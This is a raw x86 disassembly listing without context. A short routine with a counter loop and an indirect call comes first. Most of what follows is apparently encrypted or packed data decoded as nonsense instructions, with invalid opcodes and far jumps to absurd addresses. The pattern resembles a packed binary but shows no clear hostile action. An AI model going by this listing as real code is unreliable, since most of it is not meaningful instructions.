  4061a9:	mov    ah,BYTE PTR [edi+edi*2-0x3d]
  4061ad:	fcom   st(6)
  4061af:	xchg   edi,eax
  4061b0:	push   ebx
  4061b1:	xor    eax,0x9e9e8447
  4061b6:	pop    esi
  4061b7:	inc    edi
  4061b8:	mov    BYTE PTR [ecx+ebx*1+0x3272f6],al
  4061bf:	mov    eax,DWORD PTR [ebp+0xc]
  4061c2:	xor    eax,esi
  4061c4:	add    eax,edi
  4061c6:	pop    edi
  4061c7:	pop    esi
  4061c8:	pop    ebx
  4061c9:	leave  
  4061ca:	ret    0x8
  4061cd:	xor    eax,eax
  4061cf:	ret    
  4061d0:	push   ebp
  4061d1:	mov    ebp,esp
  4061d3:	sub    esp,0x38
  4061d6:	and    DWORD PTR ds:0x428ec7,0x0
  4061e0:	xor    eax,eax
  4061e2:	xor    eax,DWORD PTR ds:0x428ec7
  4061e8:	inc    eax
  4061e9:	mov    ds:0x428ec7,eax
  4061ee:	cmp    DWORD PTR ds:0x428ec7,0x24
  4061f5:	jg     0x406216
  4061fb:	jmp    0x406209
  406200:	push   DWORD PTR [ebp-0x18]
  406203:	call   DWORD PTR ds:0x42a9fb
  406209:	cmp    DWORD PTR ds:0x428ec7,0x19
  406210:	jb     0x4061e0
  406216:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  40621d:	push   ebx
  40621e:	mov    eax,ds:0x428e23
  406223:	adc    DWORD PTR ds:0x428e9f,eax
  406229:	jmp    0x4085d8
  40622e:	xchg   ebp,eax
  40622f:	(bad)
  406232:	xchg   edx,eax
  406233:	add    al,0x95
  406235:	(bad)
  406239:	stos   DWORD PTR es:[edi],eax
  40623a:	mov    ebx,0xb2d65ae
  40623f:	cmp    eax,0x60f18383
  406244:	add    DWORD PTR [ebx-0x38840ca3],0xffffff89
  40624b:	push   cs
  40624c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40624d:	jg     0x406286
  40624f:	adc    ecx,DWORD PTR [ebx]
  406251:	pop    edi
  406252:	jmp    FWORD PTR [ebp+0x12]
  406255:	shl    BYTE PTR [esi+0x20449fee],cl
  40625b:	ins    BYTE PTR es:[edi],dx
  40625c:	ret    
  40625d:	sysenter 
  40625f:	sub    edx,ecx
  406261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406262:	xchg   edi,eax
  406263:	sar    esi,1
  406265:	pop    ds
  406266:	pop    esi
  406267:	repz sbb BYTE PTR [eax+0x13],bl
  40626b:	imul   eax,esi,0xd
  40626e:	add    DWORD PTR [edx+0x14a7b8e9],0xffffffa7
  406275:	dec    esp
  406276:	ficomp WORD PTR [edx+ebp*4-0x20]
  40627a:	stos   DWORD PTR es:[edi],eax
  40627b:	stos   BYTE PTR es:[edi],al
  40627c:	mov    dh,0x7f
  40627e:	test   DWORD PTR [edi+0x26],esp
  406281:	hlt    
  406282:	clc    
  406283:	mov    ?,WORD PTR [ebx]
  406285:	std    
  406286:	dec    edx
  406287:	push   ss
  406288:	and    al,0x7f
  40628a:	in     al,0x5e
  40628c:	lahf   
  40628d:	jbe    0x4062bd
  40628f:	cmp    DWORD PTR [edi-0x3acc85a1],0xffffffb7
  406296:	inc    edi
  406297:	retf   
  406298:	jne    0x40629e
  40629a:	push   DWORD PTR [edi+edi*1]
  40629d:	aas    
  40629e:	push   cs
  40629f:	dec    ebp
  4062a0:	iret   
  4062a1:	retf   
  4062a2:	daa    
  4062a3:	out    dx,al
  4062a4:	fld    DWORD PTR [eax+0x342cfe54]
  4062aa:	sti    
  4062ab:	cmp    al,0xfc
  4062ad:	ins    BYTE PTR es:[edi],dx
  4062ae:	jp     0x406232
  4062b0:	clc    
  4062b1:	xor    al,0xf8
  4062b3:	ret    0xa915
  4062b6:	or     eax,0x57dd490
  4062bb:	neg    DWORD PTR [ebx]
  4062bd:	icebp  
  4062be:	mov    cl,0xa8
  4062c0:	call   0x3ae7:0xb3c8f9c5
  4062c7:	cli    
  4062c8:	dec    ecx
  4062c9:	repnz xor DWORD PTR [eax],ebp
  4062cc:	pop    edi
  4062cd:	popf   
  4062ce:	jb     0x40626e
  4062d0:	cmp    al,0xbd
  4062d2:	inc    ebp
  4062d3:	jbe    0x406261
  4062d5:	daa    
  4062d6:	inc    DWORD PTR [esi-0x509bce80]
  4062dc:	push   cs
  4062dd:	shl    al,cl
  4062df:	and    cl,BYTE PTR [esi-0x2a4aeae7]
  4062e5:	xchg   ebx,eax
  4062e6:	and    BYTE PTR [ebx+ecx*4],bl
  4062e9:	push   edx
  4062ea:	sbb    eax,0x40f82265
  4062ef:	or     al,0x71
  4062f1:	fwait
  4062f2:	and    bh,BYTE PTR gs:[ecx]
  4062f5:	mov    eax,ds:0xc87df32f
  4062fa:	cmp    eax,0xb87575c7
  4062ff:	xor    dl,BYTE PTR [ebp-0x216ec928]
  406305:	add    BYTE PTR [edi+0xd80c0b0],cl
  40630b:	pop    ds
  40630c:	test   eax,0x60ff3257
  406311:	pushf  
  406312:	mov    bl,0x8f
  406314:	sub    bl,BYTE PTR [ebx+0x3d]
  406317:	jmp    0xbe9c:0xf675c29d
  40631e:	jmp    0xcfb91224
  406323:	inc    esi
  406324:	mov    al,ds:0x1c78d50d
  406329:	push   edi
  40632a:	and    eax,0x270a2f54
  40632f:	or     eax,edx
  406331:	push   ebx
  406332:	jnp    0x4063a2
  406334:	mov    cs,esi
  406336:	pop    ecx
  406337:	or     BYTE PTR [esi+0x59],0x52
  40633b:	sahf   
  40633c:	mov    eax,ds:0xff95cca1
  406341:	outs   dx,BYTE PTR ds:[esi]
  406342:	cmp    al,0xdf
  406344:	pop    esi
  406345:	add    ebx,esi
  406347:	add    eax,DWORD PTR [esi+0x48a78a29]
  40634d:	call   0x54116b9b
  406352:	lds    ebp,FWORD PTR [edx-0x68]
  406355:	add    DWORD PTR [esi],edx
  406357:	and    bh,BYTE PTR ss:[ebx+ebp*4]
  40635b:	dec    ebx
  40635c:	pop    ebx
  40635d:	add    BYTE PTR [ebp-0x619b1289],dl
  406363:	mov    BYTE PTR [ecx+esi*4+0xfccb904],dl
  40636a:	inc    ebp
  40636b:	pop    ds
  40636c:	outs   dx,DWORD PTR ds:[esi]
  40636d:	dec    esp
  40636e:	enter  0x3ec1,0x58
  406372:	aam    0xf6
  406374:	or     eax,DWORD PTR ds:[ebp-0x5b]
  406378:	inc    edx
  406379:	je     0x406385
  40637b:	push   ebx
  40637c:	push   edx
  40637d:	gs dec edx
  40637f:	dec    esp
  406380:	mov    eax,ds:0xabb70a9b
  406385:	js     0x4063f6
  406387:	push   eax
  406388:	mov    esp,0xd3020054
  40638d:	popa   
  40638e:	sub    eax,0x1ac187ad
  406393:	sbb    BYTE PTR [ebp-0x282f56f6],0xfa
  40639a:	rcr    bh,cl
  40639c:	pop    ecx
  40639d:	ret    0x735c
  4063a0:	mov    eax,ds:0x327551ec
  4063a5:	add    eax,0x85146fc6
  4063aa:	jecxz  0x40639c
  4063ac:	xchg   DWORD PTR [esi],eax
  4063ae:	add    ebx,DWORD PTR [edi-0x72d6b9b5]
  4063b4:	aam    0x74
  4063b6:	pusha  
  4063b7:	inc    edi
  4063b8:	or     ebp,esp
  4063ba:	nop
  4063bb:	outs   dx,BYTE PTR ds:[esi]
  4063bc:	mov    ebx,0xed151f2
  4063c1:	push   esi
  4063c2:	sahf   
  4063c3:	out    0x5,al
  4063c5:	inc    eax
  4063c6:	cld    
  4063c7:	dec    edx
  4063c8:	hlt    
  4063c9:	add    eax,0x8784e9df
  4063ce:	pop    ebp
  4063cf:	ss das 
  4063d1:	sbb    ebx,DWORD PTR [edi]
  4063d3:	xor    DWORD PTR [esi+0x9],ebp
  4063d6:	repz xchg edi,eax
  4063d8:	stos   DWORD PTR es:[edi],eax
  4063d9:	shl    ebx,cl
  4063db:	jle    0x4063ca
  4063dd:	push   0x90141cb6
  4063e2:	xchg   ecx,eax
  4063e3:	inc    esp
  4063e4:	mov    ebp,0x256ad1a6
  4063e9:	loope  0x406374
  4063eb:	std    
  4063ec:	icebp  
  4063ed:	sub    DWORD PTR [ecx+0x6b],0xd1eb389f
  4063f4:	xchg   esp,eax
  4063f5:	mov    eax,ds:0xe295c8a6
  4063fa:	push   0xffffffd6
  4063fc:	sub    edx,ebp
  4063fe:	xor    eax,0x6d65da6d
  406403:	or     ecx,ebx
  406405:	cmp    BYTE PTR [ebx+0x6ec03707],bl
  40640b:	out    dx,al
  40640c:	pop    eax
  40640d:	and    eax,0x32f11765
  406412:	mov    esp,0xb1debabd
  406417:	ret    0x394b
  40641a:	pop    ecx
  40641b:	dec    eax
  40641d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40641e:	clc    
  40641f:	sub    eax,0x85144f9f
  406424:	inc    edx
  406425:	inc    edi
  406426:	ficomp DWORD PTR [eax+0x47]
  406429:	xchg   esp,eax
  40642b:	or     ebp,esp
  40642d:	mov    ds:0xc2b521b2,al
  406432:	sti    
  406433:	jno    0x40649f
  406435:	jo     0x4063b9
  406437:	aas    
  406438:	imul   ebx,esp,0x20c69386
  40643e:	cmp    al,0xf3
  406440:	adc    eax,0x168889
  406445:	ret    0x6ecf
  406448:	jns    0x406408
  40644a:	xchg   edx,eax
  40644b:	dec    ecx
  40644c:	jo     0x4064a1
  40644e:	mov    ch,0x90
  406450:	ja     0x4063d2
  406452:	and    edi,DWORD PTR [eax+0x605e99f8]
  406458:	inc    DWORD PTR [ebp-0x271dc6a9]
  40645e:	fs mov edi,?
  406461:	push   esi
  406462:	pop    eax
  406463:	test   eax,0x8d4e9f6d
  406468:	xlat   BYTE PTR ds:[ebx]
  406469:	xor    al,0x6
  40646b:	hlt    
  40646c:	xor    dh,BYTE PTR [edi-0x7b024523]
  406472:	mov    ebp,0xf32587c2
  406477:	sbb    DWORD PTR [eax+esi*8],eax
  40647a:	pop    ecx
  40647b:	xor    ebx,DWORD PTR [ebp+0x56fea729]
  406481:	pop    ecx
  406482:	pop    ebx
  406483:	out    0x55,al
  406485:	mov    ?,esi
  406487:	push   ebx
  406488:	test   al,0x8a
  40648a:	sub    BYTE PTR [ebp-0x70c270d7],0xc8
  406491:	mov    edi,0xe3b39bcf
  406496:	fisub  WORD PTR [edx]
  406498:	xor    al,0x41
  40649a:	mov    WORD PTR [ecx+0xb],ss
  40649d:	push   0xfffffffe
  40649f:	or     BYTE PTR [ebp-0x7a],ah
  4064a2:	call   0x7f93c3de
  4064a7:	mov    WORD PTR [edi],?
  4064a9:	sar    ecx,cl
  4064ab:	iret   
  4064ac:	fbstp  TBYTE PTR [ebp-0x476b9cf5]
  4064b2:	cmp    BYTE PTR [eax],0xba
  4064b5:	or     edi,DWORD PTR [ecx+0xd]
  4064b8:	adc    DWORD PTR [esi+0x64],eax
  4064bb:	(bad)  
  4064bc:	into   
  4064bd:	fs enter 0xa715,0xb8
  4064c2:	in     al,0xe7
  4064c4:	ret    
  4064c5:	test   al,bh
  4064c7:	mov    edi,ecx
  4064c9:	das    
  4064ca:	popf   
  4064cb:	xchg   ecx,eax
  4064cc:	xchg   BYTE PTR gs:0xa7047041,ch
  4064d3:	add    DWORD PTR [ebx],edx
  4064d5:	adc    al,BYTE PTR [eax-0xb3b51ca]
  4064db:	scas   al,BYTE PTR es:[edi]
  4064dc:	hlt    
  4064dd:	mov    ss:0x302e3387,al
  4064e3:	ss out 0xe0,al
  4064e6:	push   ecx
  4064e7:	out    0x47,eax
  4064e9:	cld    
  4064ea:	xchg   ebx,eax
  4064eb:	dec    ebp
  4064ec:	sub    BYTE PTR [edi-0x181c6805],dl
  4064f2:	sbb    bh,BYTE PTR [edx+0x5e]
  4064f5:	daa    
  4064f6:	out    dx,al
  4064f7:	mov    edi,DWORD PTR [ebx+ebp*8-0xc]
  4064fb:	adc    eax,0x71e5098c
  406500:	mov    eax,ds:0x28ce5032
  406505:	out    dx,al
  406506:	mov    eax,0x9d92ce36
  40650b:	xchg   ecx,eax
  40650c:	test   BYTE PTR [eax-0x1337cd06],0xf4
  406513:	imul   ecx,DWORD PTR [ecx-0x159426f0],0x7f
  40651a:	bound  esi,QWORD PTR [ecx-0x72163176]
  406520:	das    
  406521:	jmp    0xc5eb437
  406526:	nop
  406527:	adc    DWORD PTR [esi+ebx*2],ebp
  40652a:	(bad)  
  40652b:	jbe    0x406514
  40652d:	int    0x67
  40652f:	cmc    
  406530:	adc    dh,BYTE PTR [edx]
  406532:	jnp    0x4064ed
  406534:	cmc    
  406535:	xchg   edi,eax
  406536:	sahf   
  406537:	pushf  
  406538:	sbb    ebp,DWORD PTR [esi-0x54]
  40653b:	(bad)
  40653f:	cld    
  406540:	xchg   ebp,eax
  406541:	aaa    
  406542:	xor    edx,DWORD PTR ds:0x6690bea
  406548:	mov    eax,ds:0xc294bf4d
  40654d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40654e:	rol    DWORD PTR [eax+0x7],1
  406551:	shl    BYTE PTR [ecx-0x63],cl
  406554:	pop    edx
  406555:	rcr    DWORD PTR ds:0x461377c3,cl
  40655b:	cmp    al,0xca
  40655d:	push   eax
  40655e:	mov    WORD PTR [ecx*8+0x663529dc],cs
  406565:	add    BYTE PTR ds:0xd0472901,bh
  40656b:	sub    al,0xb
  40656d:	mov    eax,ds:0x38f4e11b
  406572:	stos   BYTE PTR es:[edi],al
  406573:	and    eax,ecx
  406575:	ficomp DWORD PTR [ebp+0x79bf53ba]
  40657b:	jne    0x406532
  40657d:	xchg   BYTE PTR [esi+0x3],ah
  406580:	xor    BYTE PTR [eax+0x5a],0xa5
  406584:	inc    ebp
  406585:	or     dh,BYTE PTR [ecx-0x1487f314]
  40658b:	pop    ss
  40658c:	jb     0x406584
  40658e:	call   0x3975:0xbc81ec79
  406595:	sub    eax,0xf109388
  40659a:	leave  
  40659b:	pop    edx
  40659c:	cdq    
  40659d:	outs   dx,DWORD PTR ds:[esi]
  40659e:	jbe    0x406593
  4065a0:	aad    0x2c
  4065a2:	mov    esi,0x494633a0
  4065a7:	push   ds
  4065a8:	xchg   edx,eax
  4065a9:	fs popf 
  4065ab:	and    BYTE PTR [eax],0xd1
  4065ae:	inc    esi
  4065af:	or     eax,0x57bce83f
  4065b4:	fisttp DWORD PTR [edx-0xf]
  4065b7:	nop
  4065b8:	scas   al,BYTE PTR es:[edi]
  4065b9:	jp     0x406576
  4065bb:	shl    DWORD PTR [edx+0x43],1
  4065be:	xchg   ebx,eax
  4065bf:	inc    esp
  4065c0:	jae    0x40662d
  4065c2:	mov    cl,0x31
  4065c4:	xchg   ah,dl
  4065c6:	mov    edx,0x4fcf2308
  4065cb:	dec    esp
  4065cc:	(bad)  
  4065ce:	div    DWORD PTR ds:0x41b52371
  4065d4:	int3   
  4065d5:	es jbe 0x406635
  4065d8:	mov    es,WORD PTR [edx+ebp*1-0x751e9181]
  4065df:	psllq  mm4,QWORD PTR [eax+edi*4+0x431d4ccd]
  4065e7:	(bad)  
  4065e8:	in     al,dx
  4065e9:	push   ebx
  4065ea:	xor    eax,0xce19b0ed
  4065ef:	or     bl,dh
  4065f1:	call   0x87d2:0x9e63e159
  4065f8:	fiadd  WORD PTR [eax+ebx*1-0x695cfc08]
  4065ff:	pop    esi
  406600:	fs xor eax,0xb3be4276
  406606:	sbb    dh,BYTE PTR [esi+0x4d75eab0]
  40660c:	mov    ebp,DWORD PTR [edi-0x34]
  40660f:	repnz add al,dh
  406612:	cmp    al,0xc0
  406614:	mov    edx,0x77f12e53
  406619:	jmp    0x2e5c:0x164e3908
  406620:	call   0x7f7b04c8
  406625:	stos   BYTE PTR es:[edi],al
  406626:	mov    WORD PTR [esi+0x21],?
  406629:	xchg   ebx,eax
  40662a:	push   ds
  40662b:	cli    
  40662c:	sub    BYTE PTR [bx],0x42
  406630:	dec    ebx
  406631:	out    0x44,al
  406633:	(bad)  
  406634:	adc    BYTE PTR [esi],ch
  406636:	iret   
  406637:	ficomp WORD PTR [eax+0x35]
  40663a:	sbb    bh,BYTE PTR [eax+0x3e31bec6]
  406640:	icebp  
  406641:	int3   
  406642:	mov    bh,0xef
  406644:	push   edi
  406645:	dec    edi
  406646:	sbb    eax,0x66b6e7
  40664b:	jmp    0x2cd05d93
  406650:	(bad)  
  406651:	jle    0x40666a
  406653:	ret    
  406654:	fwait
  406655:	push   0x5c
  406657:	push   ebx
  406658:	mov    al,ds:0x2eab4d89
  40665d:	dec    edx
  40665e:	mov    eax,ds:0x8c635a22
  406663:	mov    ebp,0x32ee4f1
  406668:	fcmovb st,st(7)
  40666a:	aas    
  40666b:	clc    
  40666c:	mov    esi,es
  40666e:	mov    edi,0xabf53d55
  406673:	retf   
  406674:	enter  0xf840,0x4e
  406678:	fild   DWORD PTR [esi+0x6e517c4b]
  40667e:	push   esi
  40667f:	and    BYTE PTR [eax],cl
  406681:	sub    dl,BYTE PTR [eax]
  406683:	test   BYTE PTR [edi+0x21063345],0x95
  40668a:	fucomi st,st(4)
  40668c:	xchg   edi,eax
  40668d:	add    BYTE PTR [ecx-0x15],0xc9
  406691:	inc    esi
  406692:	xchg   BYTE PTR [ebx+ebx*4-0x39e25443],dh
  406699:	sub    esi,edi
  40669b:	sbb    BYTE PTR [ebx-0x53],ah
  40669e:	gs iret 
  4066a0:	jp     0x406702
  4066a2:	push   esp
  4066a3:	enter  0x6d2f,0xf1
  4066a7:	xor    bl,BYTE PTR [ebx]
  4066a9:	pop    ecx
  4066aa:	and    DWORD PTR [ecx+edi*4+0x175870e],eax
  4066b1:	pop    ecx
  4066b2:	scas   al,BYTE PTR es:[edi]
  4066b3:	and    esi,DWORD PTR [ebp+0x34]
  4066b6:	shl    BYTE PTR [eax+eiz*2-0x76],cl
  4066ba:	pop    edi
  4066bb:	nop
  4066bc:	xchg   esi,eax
  4066bd:	mov    ds:0xf4713fa7,eax
  4066c2:	imul   DWORD PTR [eax]
  4066c4:	pop    es
  4066c5:	out    dx,al
  4066c6:	(bad)  
  4066c7:	sub    DWORD PTR [eax-0x1b],edx
  4066ca:	cdq    
  4066cb:	dec    ebp
  4066cc:	icebp  
  4066cd:	mov    eax,ds:0xd92f9fe6
  4066d2:	cmp    esp,eax
  4066d4:	ins    BYTE PTR es:[edi],dx
  4066d5:	loop   0x406678
  4066d7:	push   0x404076d7
  4066dc:	ret    
  4066dd:	retf   0x1d28
  4066e0:	or     DWORD PTR [ebp-0x1b],0x51
  4066e4:	add    BYTE PTR [edi+0x7f],dh
  4066e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066e8:	lods   eax,DWORD PTR ds:[esi]
  4066e9:	adc    bl,BYTE PTR [edi-0x62]
  4066ec:	int    0xad
  4066ee:	xor    ch,BYTE PTR [esi-0x6a]
  4066f1:	out    dx,al
  4066f2:	cs sub eax,0x80fcfaaa
  4066f8:	push   edx
  4066f9:	aad    0xac
  4066fb:	es dec esp
  4066fd:	ret    
  4066fe:	test   BYTE PTR [esi],dl
  406700:	je     0x406721
  406702:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406703:	jb     0x40669d
  406705:	mov    BYTE PTR ds:0x8d77adf,dl
  40670b:	mov    ah,bh
  40670d:	cmp    BYTE PTR [eax-0x57],bh
  406710:	pop    ebx
  406711:	js     0x4066c4
  406713:	lds    edi,FWORD PTR [eax-0x17]
  406716:	cmp    bh,ah
  406718:	hlt    
  406719:	add    al,0xe5
  40671b:	data16 or dh,al
  40671e:	jl     0x406716
  406720:	ret    0xe2df
  406723:	mov    ah,0x57
  406725:	adc    BYTE PTR [edx+0x16],bh
  406728:	in     al,dx
  406729:	add    al,0xc2
  40672b:	add    ah,BYTE PTR [esi-0x65298907]
  406731:	into   
  406732:	dec    esp
  406733:	cmp    al,0x77
  406735:	sub    ch,BYTE PTR [ebp+0x79c6125a]
  40673b:	ins    BYTE PTR es:[edi],dx
  40673c:	mov    DWORD PTR [ecx+0x8146719],edx
  406742:	xchg   esi,eax
  406743:	shl    BYTE PTR [ecx-0x262260d5],cl
  406749:	mov    esp,0x2568252a
  40674e:	and    eax,ecx
  406750:	xchg   ebp,eax
  406751:	mov    eax,ds:0xff36ed5a
  406756:	xlat   BYTE PTR ds:[ebx]
  406757:	push   edx
  406758:	into   
  406759:	push   cs
  40675a:	clc    
  40675b:	(bad)  
  40675c:	out    dx,eax
  40675d:	cmp    BYTE PTR ds:0x8062f119,dh
  406763:	stc    
  406764:	mov    ah,BYTE PTR [ebp+0x3f]
  406767:	pop    esi
  406768:	xor    cl,BYTE PTR [ebp+0x511b9d20]
  40676e:	add    DWORD PTR [esi-0x13],esi
  406771:	loopne 0x40679f
  406773:	mov    WORD PTR [eax],?
  406775:	and    eax,0x42e37828
  40677a:	lahf   
  40677b:	mov    eax,0x24b8fb93
  406780:	push   ebp
  406781:	push   esp
  406782:	adc    BYTE PTR [ebp-0x10],ch
  406785:	sti    
  406786:	mov    bl,0x8c
  406788:	dec    dl
  40678a:	cli    
  40678b:	jbe    0x406756
  40678d:	mov    edi,ecx
  40678f:	fwait
  406790:	pop    esi
  406791:	rcl    DWORD PTR [ecx+0x4b204bb1],cl
  406797:	fisubr WORD PTR [ebx+0x798e1514]
  40679d:	adc    eax,0x9d154885
  4067a2:	iret   
  4067a3:	dec    esp
  4067a4:	pop    esp
  4067a5:	pop    ds
  4067a6:	cdq    
  4067a7:	cld    
  4067a8:	stos   DWORD PTR es:[edi],eax
  4067a9:	xor    cl,BYTE PTR es:[edx-0x7d]
  4067ad:	(bad)  
  4067af:	mov    eax,0x68c6d5cd
  4067b4:	call   0x97649181
  4067b9:	sbb    ah,bl
  4067bb:	repz add ah,BYTE PTR [edx]
  4067be:	pop    edx
  4067bf:	jns    0x406792
  4067c1:	xor    DWORD PTR [eax+0x6a800940],0xf74660b4
  4067cb:	mov    DWORD PTR [edi-0x12e54189],0x1ae5bac1
  4067d5:	js     0x4067c4
  4067d7:	inc    esi
  4067d8:	jae    0x4067d4
  4067da:	retf   
  4067db:	cld    
  4067dc:	dec    ebx
  4067dd:	mov    ch,0x86
  4067df:	loop   0x406785
  4067e1:	add    eax,0xf59e6fde
  4067e6:	(bad)  
  4067e7:	adc    al,0x83
  4067e9:	inc    ebp
  4067ea:	dec    ebp
  4067eb:	arpl   bx,sp
  4067ed:	popf   
  4067ee:	or     eax,0xd40b606e
  4067f3:	xchg   BYTE PTR [edx+eax*2-0x37],bl
  4067f7:	sbb    DWORD PTR [esp+esi*1],0x40
  4067fb:	push   ss
  4067fc:	mov    ch,0x92
  4067fe:	jne    0x406879
  406800:	bound  eax,QWORD PTR [eax+0x54b8c5e5]
  406806:	test   bl,ah
  406808:	cmp    ch,ch
  40680a:	out    0xaf,al
  40680c:	lahf   
  40680d:	xor    cl,BYTE PTR [edi+edi*4-0x1c299d80]
  406814:	scas   al,BYTE PTR es:[edi]
  406815:	mov    bl,0xff
  406817:	mov    ds:0x57b434b0,eax
  40681c:	lea    edx,[ebx]
  40681e:	int    0x7e
  406820:	lock add al,0xa1
  406823:	test   al,0x29
  406825:	xor    ah,BYTE PTR [ebp-0x5c]
  406828:	imul   DWORD PTR [ebp+0x4ce268e5]
  40682e:	mov    ds:0x47529eed,al
  406833:	mov    ebx,0x22c4dc3b
  406838:	push   edx
  406839:	cdq    
  40683a:	lds    ecx,FWORD PTR [ebx+esi*2+0x75cdf698]
  406841:	and    BYTE PTR [ecx-0x4e],cl
  406844:	mov    dl,dh
  406846:	mov    ch,BYTE PTR [esi-0x6f]
  406849:	jo     0x40682f
  40684b:	scas   eax,DWORD PTR es:[edi]
  40684c:	jae    0x406862
  40684e:	mov    ah,BYTE PTR [ebx+eax*2]
  406851:	xchg   ecx,eax
  406852:	or     ebp,DWORD PTR [esi+0x26709c2f]
  406858:	xchg   edx,eax
  406859:	dec    ecx
  40685a:	adc    al,0x21
  40685c:	fcomp  QWORD PTR [eax]
  40685e:	cmp    BYTE PTR [ebx],bl
  406860:	push   cs
  406861:	jb     0x4068c9
  406863:	dec    eax
  406864:	aad    0x21
  406866:	xchg   esi,eax
  406867:	shl    DWORD PTR [ecx],0xdb
  40686a:	in     eax,0x7b
  40686c:	adc    BYTE PTR [eax+0x60b937f1],ah
  406872:	and    al,0x69
  406874:	lods   al,BYTE PTR ds:[esi]
  406875:	mov    edi,0x9cfca89d
  40687a:	mov    bh,0x24
  40687c:	pushf  
  40687d:	enter  0x4f44,0xff
  406881:	jle    0x406815
  406883:	std    
  406884:	aaa    
  406885:	hlt    
  406886:	jno    0x4068e2
  406888:	data16 arpl WORD PTR [ecx-0x75f3dad0],sp
  40688f:	jl     0x40684c
  406891:	jmp    0x406833
  406893:	dec    edx
  406894:	les    eax,FWORD PTR [ecx]
  406896:	cli    
  406897:	pop    ss
  406898:	jbe    0x40686f
  40689a:	inc    ebp
  40689b:	fcom   DWORD PTR [eax]
  40689d:	sti    
  40689e:	inc    ebp
  40689f:	jmp    0x3b76:0xf2323709
  4068a6:	xlat   BYTE PTR ds:[ebx]
  4068a7:	push   0xffffff91
  4068a9:	push   DWORD PTR [ebx+0x4e]
  4068ac:	push   edi
  4068ad:	xor    ch,cl
  4068af:	pop    eax
  4068b0:	arpl   WORD PTR [ebx-0x18743216],si
  4068b6:	mov    eax,0x7417579a
  4068bb:	(bad)  
  4068bc:	jmp    0x40690c
  4068be:	push   esi
  4068bf:	clc    
  4068c0:	aas    
  4068c1:	sub    eax,0x23473c59
  4068c6:	pop    edi
  4068c7:	mov    edi,0x8cd04083
  4068cc:	dec    ebx
  4068cd:	push   ss
  4068ce:	je     0x4068d7
  4068d0:	stos   BYTE PTR es:[edi],al
  4068d1:	or     BYTE PTR [esi+0x5f],bl
  4068d4:	sub    DWORD PTR [esi],edi
  4068d6:	mov    edi,0x9b1e69a2
  4068db:	push   ebx
  4068dc:	fld    DWORD PTR [edi]
  4068de:	add    BYTE PTR [ebx],dh
  4068e0:	popa   
  4068e1:	test   BYTE PTR [edx+0x67],ah
  4068e4:	stc    
  4068e5:	(bad)  
  4068e6:	rol    BYTE PTR [ebx+0x79d9ec2e],1
  4068ec:	mov    bh,0xc0
  4068ee:	xor    ebx,DWORD PTR [ebp+ecx*8+0x10]
  4068f2:	mov    bh,0xcf
  4068f4:	inc    esi
  4068f5:	fld    QWORD PTR [esi+0x4d]
  4068f8:	scas   eax,DWORD PTR es:[edi]
  4068f9:	inc    esp
  4068fa:	mov    BYTE PTR [ebx-0x61],bh
  4068fd:	outs   dx,DWORD PTR ds:[esi]
  4068fe:	div    DWORD PTR [ecx]
  406900:	sbb    eax,eax
  406902:	imul   ebp,DWORD PTR [esi],0x1e714f9b
  406908:	(bad)  
  406909:	(bad)  
  40690a:	mov    edi,0x60a37cb8
  40690f:	and    DWORD PTR ds:[eax+ecx*2],edi
  406913:	ss clc 
  406915:	call   DWORD PTR [edx]
  406917:	out    0x9f,eax
  406919:	cld    
  40691a:	jae    0x406979
  40691c:	inc    esp
  40691d:	stos   BYTE PTR es:[edi],al
  40691e:	xor    bh,BYTE PTR [ebx-0x3034fa0a]
  406924:	inc    edx
  406925:	push   ds
  406926:	gs fwait
  406928:	or     ebp,ebp
  40692a:	xor    eax,0x47f453ca
  40692f:	(bad)  
  406930:	pop    ecx
  406931:	cmc    
  406932:	pop    es
  406933:	mov    al,ds:0x234ae284
  406938:	inc    ebx
  406939:	test   al,0x1a
  40693b:	daa    
  40693c:	inc    edi
  40693d:	js     0x4069aa
  40693f:	mov    cs:0x8e87d546,eax
  406945:	inc    ebx
  406946:	dec    ebx
  406947:	cmp    edi,DWORD PTR [ebx-0x754e93d5]
  40694d:	sbb    DWORD PTR [ebp+0x53],edi
  406950:	and    al,0x84
  406952:	out    dx,eax
  406953:	leave  
  406954:	cld    
  406955:	jbe    0x406944
  406957:	gs pop esp
  406959:	xchg   ebx,eax
  40695a:	leave  
  40695b:	mov    ah,0x64
  40695d:	push   0x1b
  40695f:	mov    dh,bl
  406961:	repz pop ebp
  406963:	jp     0x4068e7
  406965:	adc    al,0xcd
  406967:	shl    dh,cl
  406969:	xchg   ecx,eax
  40696a:	mov    eax,DWORD PTR [edi+0x5558015c]
  406970:	(bad)  
  406971:	xchg   ebp,eax
  406972:	fiadd  DWORD PTR [ebp-0x27]
  406975:	inc    esi
  406976:	cdq    
  406977:	inc    ecx
  406978:	into   
  406979:	mov    ebp,0x575da86c
  40697e:	pop    es
  40697f:	mov    edx,0x758ada45
  406984:	jb     0x4069fb
  406986:	(bad)  ds:0x18f86c7e
  40698c:	dec    ebp
  40698d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40698e:	mov    bl,0x55
  406990:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406991:	mov    dh,0xdb
  406993:	mov    ?,WORD PTR [eax+0x6a]
  406996:	inc    ebx
  406997:	std    
  406998:	jmp    0x406955
  40699a:	mov    cs,WORD PTR ds:0x4fbd8708
  4069a0:	popa   
  4069a1:	mov    al,0x74
  4069a3:	and    DWORD PTR [ecx],ebp
  4069a5:	icebp  
  4069a6:	in     eax,0xc2
  4069a8:	shl    BYTE PTR [eax-0x4d83be4b],1
  4069ae:	loop   0x4069c9
  4069b0:	leave  
  4069b1:	push   ecx
  4069b2:	in     al,dx
  4069b3:	pop    esp
  4069b4:	mov    ebp,0x7307a2bb
  4069b9:	pop    es
  4069ba:	in     al,dx
  4069bb:	jecxz  0x4069b1
  4069bd:	mov    cl,0xf4
  4069bf:	cmp    DWORD PTR ds:0x9567c362,eax
  4069c5:	in     al,dx
  4069c6:	xchg   esp,eax
  4069c7:	inc    ebp
  4069c8:	push   0xffffffec
  4069ca:	jae    0x406a2e
  4069cc:	pop    ecx
  4069cd:	and    eax,0x59f3a105
  4069d2:	sbb    BYTE PTR ds:0x83ae6561,cl
  4069d8:	jp     0x406a30
